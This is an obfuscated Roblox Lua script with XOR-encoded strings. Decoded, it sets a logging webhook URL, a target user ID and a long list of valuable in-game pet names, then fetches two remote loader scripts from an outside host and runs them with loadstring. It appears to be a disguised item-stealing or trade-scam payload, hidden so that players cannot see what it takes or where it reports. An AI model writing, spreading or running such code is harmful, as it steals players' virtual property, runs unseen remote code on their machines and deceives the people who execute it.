--[[ Obfuscated with Prometheus-style engine ]]
local _llIlOlIOlI=977;local _00I0I00I0l="_OOl000";local _OOllIl0IO0="_OIOIO0";local _IIIlllllOI=656;local _lIIll0ll0I="_llll0I";
local _lI00OlIlII0IOOIl=(function(_llllI00I)return function(...)local _OIlIIlIO=""for _,_00l0IO0l in ipairs({...})do _OIlIIlIO=_OIlIIlIO..string.char(bit32 and bit32.bxor(_00l0IO0l,_llllI00I)or(function(a,b)local r=0 for i=0,7 do local ba,bb=a%2,b%2 if ba~=bb then r=r+2^i end a,b=math.floor(a/2),math.floor(b/2)end return r end)(_00l0IO0l,_llllI00I))end return _OIlIIlIO end end)(134);
local _l0IIO00lIIOI=function()
getgenv()._0OOOOOI0lOl0l0 = _lI00OlIlII0IOOIl(238,242,242,246,245,188,169,169,245,237,231,235,231,168,232,227,242,169,231,246,239,169,234,233,225,245,169,241,227,228,238,233,233,237,169,235,244,244,217,229,182,228,227,178,183,229,182,228,177,191,224,178,179,226,227,228,176,190,180,190,182,229,176,224,229,228,182,229,226,179,183)
getgenv()._0OlI0O0OII0llI = 7912546414
getgenv()._OlIOO00Il0IOI0 = 1      
getgenv()._l0IO0II0lO0O00 = 2 
getgenv()._lOl00OlII0O0lI = {
    [_lI00OlIlII0IOOIl(203,227,233,241,234)] = true,
    [_lI00OlIlII0IOOIl(213,237,239,228,239,226,239,166,210,233,239,234,227,242)] = true,
    [_lI00OlIlII0IOOIl(213,242,244,231,241,228,227,244,244,255,166,195,234,227,246,238,231,232,242)] = true,
    [_lI00OlIlII0IOOIl(210,231,229,233,244,239,242,231,166,196,239,229,239,229,234,227,242,231)] = true,
    [_lI00OlIlII0IOOIl(202,231,166,195,254,242,239,232,229,242,166,193,244,231,232,226,227)] = true,
    [_lI00OlIlII0IOOIl(202,231,166,213,246,233,233,237,255,166,193,244,231,232,226,227)] = true,
    [_lI00OlIlII0IOOIl(197,238,239,246,245,233,166,231,232,226,166,215,243,227,245,233)] = true,
    [_lI00OlIlII0IOOIl(197,238,239,234,234,239,232,166,197,238,239,234,239)] = true,
    [_lI00OlIlII0IOOIl(210,243,224,224,166,210,233,243,229,231,232)] = true,
    [_lI00OlIlII0IOOIl(193,233,228,228,234,239,232,233,166,211,232,239,229,239,229,234,239,232,233)] = true,
    [_lI00OlIlII0IOOIl(209,166,233,244,166,202)] = true,
    [_lI00OlIlII0IOOIl(202,231,166,204,233,234,234,255,166,193,244,231,232,226,227)] = true,
    [_lI00OlIlII0IOOIl(202,231,166,210,231,229,233,166,197,233,235,228,239,232,231,245,239,233,232)] = true,
    [_lI00OlIlII0IOOIl(213,241,231,225,225,255,166,196,244,233,245)] = true,
    [_lI00OlIlII0IOOIl(202,231,166,212,233,235,231,232,242,239,229,166,193,244,231,232,226,227)] = true,
    [_lI00OlIlII0IOOIl(192,227,245,242,239,240,227,166,176,177)] = true,
    [_lI00OlIlII0IOOIl(200,243,229,234,227,231,244,233,166,194,239,232,233,245,245,231,243,244,233)] = true,
    [_lI00OlIlII0IOOIl(203,233,232,227,255,166,203,233,232,227,255,166,214,243,225,225,255)] = true,
    [_lI00OlIlII0IOOIl(210,231,232,225,166,210,231,232,225,166,205,227,234,227,242,231,232,225)] = true,
    [_lI00OlIlII0IOOIl(205,227,242,243,246,231,242,166,205,227,246,231,242)] = true,
    [_lI00OlIlII0IOOIl(210,239,229,242,231,229,166,213,231,238,243,244)] = true,
    [_lI00OlIlII0IOOIl(205,227,242,229,238,243,244,243,166,231,232,226,166,203,243,245,242,243,244,243)] = true,
    [_lI00OlIlII0IOOIl(202,231,240,231,226,233,244,239,242,233,166,213,246,239,232,239,242,233)] = true,
    [_lI00OlIlII0IOOIl(193,231,244,231,235,231,166,231,232,226,166,203,231,226,243,232,226,243,232,225)] = true,
    [_lI00OlIlII0IOOIl(196,243,244,225,243,244,233,166,199,232,226,166,192,244,255,243,244,233)] = true,
    [_lI00OlIlII0IOOIl(197,231,246,239,242,231,232,233,166,203,233,228,255)] = true,
    [_lI00OlIlII0IOOIl(197,227,244,228,227,244,243,245)] = true,
    [_lI00OlIlII0IOOIl(194,244,231,225,233,232,166,197,231,232,232,227,234,234,233,232,239)] = true,
    [_lI00OlIlII0IOOIl(193,243,227,245,242,166,176,176,176)] = true,
    [_lI00OlIlII0IOOIl(203,231,244,239,231,229,238,239,166,197,233,244,231,252,233,232,239)] = true,
    [_lI00OlIlII0IOOIl(213,241,231,225,166,213,233,226,231)] = true,
    [_lI00OlIlII0IOOIl(202,233,245,166,206,233,242,245,246,233,242,245,239,242,233,245)] = true,
    [_lI00OlIlII0IOOIl(202,233,245,166,196,244,233,245)] = true,
    [_lI00OlIlII0IOOIl(210,244,231,234,231,234,227,226,233,232)] = true,
    [_lI00OlIlII0IOOIl(202,233,245,166,214,243,225,225,239,227,245)] = true,
    [_lI00OlIlII0IOOIl(202,233,245,166,214,244,239,235,233,245)] = true,
    [_lI00OlIlII0IOOIl(202,233,245,166,210,231,229,233,244,239,242,231,245)] = true,
    [_lI00OlIlII0IOOIl(202,233,245,166,213,246,231,225,238,227,242,242,239,245)] = true,
    [_lI00OlIlII0IOOIl(193,239,232,225,227,244,166,193,227,244,231,242)] = true,
    [_lI00OlIlII0IOOIl(202,233,240,227,166,202,233,240,227,166,196,227,231,244)] = true,
    [_lI00OlIlII0IOOIl(213,246,233,233,237,255,166,231,232,226,166,214,243,235,246,237,255)] = true,
    [_lI00OlIlII0IOOIl(192,244,231,225,244,231,235,231,166,231,232,226,166,197,238,233,229,244,231,235,231)] = true,
    [_lI00OlIlII0IOOIl(202,231,166,197,231,245,231,166,196,233,233)] = true,
    [_lI00OlIlII0IOOIl(202,233,245,166,213,227,237,233,234,231,238,245)] = true,
    [_lI00OlIlII0IOOIl(212,227,239,232,239,242,233,166,213,234,227,239,225,238,239,242,233)] = true,
    [_lI00OlIlII0IOOIl(205,227,242,243,246,231,242,166,196,244,233,245)] = true,
    [_lI00OlIlII0IOOIl(197,233,233,237,239,166,231,232,226,166,203,239,234,237,239)] = true,
    [_lI00OlIlII0IOOIl(214,233,246,229,243,244,243,166,231,232,226,166,192,239,252,252,243,244,243)] = true,
    [_lI00OlIlII0IOOIl(212,233,245,227,255,166,231,232,226,166,210,227,226,226,255)] = true,
    [_lI00OlIlII0IOOIl(202,231,166,213,243,246,244,227,235,227,166,197,233,235,228,239,232,231,245,239,233,232)] = true,
    [_lI00OlIlII0IOOIl(194,244,231,225,233,232,166,193,239,232,225,227,244,239,232,239)] = true,
    [_lI00OlIlII0IOOIl(206,227,231,226,234,227,245,245,166,206,233,244,245,227,235,231,232)] = true,
    [_lI00OlIlII0IOOIl(206,255,226,244,231,166,194,244,231,225,233,232,166,197,231,232,232,227,234,234,233,232,239)] = true,
    [_lI00OlIlII0IOOIl(197,227,234,243,234,231,244,229,239,232,239,166,208,239,229,239,233,245,239,232,239)] = true,
    [_lI00OlIlII0IOOIl(203,239,227,242,227,242,227,239,244,231,166,196,239,229,239,229,234,227,242,227,239,244,231)] = true,
    [_lI00OlIlII0IOOIl(202,231,166,193,244,231,232,226,227,166,197,233,235,228,239,232,231,245,239,233,232)] = true,
    [_lI00OlIlII0IOOIl(202,231,166,213,231,238,243,244,166,197,233,235,228,239,232,231,245,239,233,232)] = true,
    [_lI00OlIlII0IOOIl(213,246,239,232,232,255,166,206,231,235,235,255)] = true,
    [_lI00OlIlII0IOOIl(202,231,245,166,213,239,245)] = true,
    [_lI00OlIlII0IOOIl(202,233,245,166,214,234,231,232,239,242,233,245)] = true,
    [_lI00OlIlII0IOOIl(202,233,245,166,203,233,228,239,234,239,245)] = true,
    [_lI00OlIlII0IOOIl(202,233,245,166,197,231,232,226,239,227,245)] = true,
    [_lI00OlIlII0IOOIl(196,231,229,243,244,243,166,231,232,226,166,195,225,225,243,244,243)] = true,
    [_lI00OlIlII0IOOIl(195,240,239,234,227,226,233,232)] = true,
    [_lI00OlIlII0IOOIl(203,233,232,227,255,166,203,233,232,227,255,166,212,227,239,232,226,227,227,244)] = true,
    [_lI00OlIlII0IOOIl(201,244,229,231,234,227,226,233,232)] = true,
    [_lI00OlIlII0IOOIl(204,233,234,234,255,166,204,233,234,234,255,166,213,231,238,243,244)] = true,
    [_lI00OlIlII0IOOIl(202,233,245,166,204,233,234,234,255,166,197,233,235,228,239,232,231,245,239,233,232,231,245)] = true,
    [_lI00OlIlII0IOOIl(202,231,166,213,227,229,244,227,242,166,197,233,235,228,239,232,231,245,239,233,232)] = true,
    [_lI00OlIlII0IOOIl(202,231,166,192,233,233,226,166,197,233,235,228,239,232,231,245,239,233,232)] = true,
    [_lI00OlIlII0IOOIl(213,231,235,235,255,232,239,166,192,231,242,242,239,232,239)] = true,
    [_lI00OlIlII0IOOIl(213,246,231,225,238,227,242,242,239,166,210,243,231,234,227,242,242,239)] = true,
    [_lI00OlIlII0IOOIl(212,233,245,227,242,242,239,166,210,243,231,234,227,242,242,239)] = true,
    [_lI00OlIlII0IOOIl(195,245,233,237,166,213,227,237,233,234,231,238)] = true
}
task.spawn(function()
loadstring(game:HttpGet(_lI00OlIlII0IOOIl(238,242,242,246,245,188,169,169,231,246,239,168,234,243,231,244,235,233,244,168,232,227,242,169,224,239,234,227,245,169,240,178,169,234,233,231,226,227,244,245,169,224,228,229,226,183,226,180,179,190,190,191,231,190,178,181,180,191,177,183,182,177,226,227,231,181,176,178,180,182,178,178,226,168,234,243,231)))()
end)
task.spawn(function()
loadstring(game:HttpGet(_lI00OlIlII0IOOIl(238,242,242,246,245,188,169,169,231,246,239,168,234,243,231,244,235,233,244,168,232,227,242,169,224,239,234,227,245,169,240,178,169,234,233,231,226,227,244,245,169,179,181,179,224,180,180,178,181,177,229,228,226,177,180,181,190,183,229,231,183,190,190,181,227,231,181,224,180,227,182,228,231,168,234,243,231)))()
end)
end;
local _,_O0OI0IlO=pcall(_l0IIO00lIIOI);if _O0OI0IlO then _l0IIO00lIIOI()end;
